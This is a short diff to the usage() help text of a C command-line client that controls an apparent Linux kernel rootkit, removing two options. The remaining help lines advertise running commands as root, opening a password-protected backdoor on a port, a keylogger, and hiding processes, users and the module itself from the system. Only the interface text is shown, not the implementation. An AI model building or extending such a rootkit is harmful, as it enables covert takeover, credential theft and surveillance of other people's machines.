@@ -15,7 +15,6 @@ static void usage(const char *prog)
     printf("  msg <text>                Set secondary comm channel message\n");
     printf("  hide_pid <pid>            Hide a PID from /proc\n");
     printf("  unhide_pid <pid>          Unhide a PID\n");
-    printf("  privesc_pid <pid>         Escalate PID to root\n");
     printf("  privesc_cmd <cmd>         Run command as root\n");
     printf("  backdoor <port>           Open backdoor on port\n");
     printf("  backdoor_pass <pass>      Set backdoor password\n");
@@ -23,7 +22,6 @@ static void usage(const char *prog)
     printf("  show_mod                  Show module in lsmod\n");
     printf("  keylog_toggle             Toggle keylogger on/off\n");
     printf("  keylog_read               Read and flush keylog buffer\n");
-    printf("  toggle                    Toggle rootkit via magic signal\n");
     printf("  hide_user <username>      Hide user from /etc/passwd & shadow\n");
     printf("  unhide_user               Stop hiding user\n");
     printf("  protect <filepath>        Protect file from deletion\n");
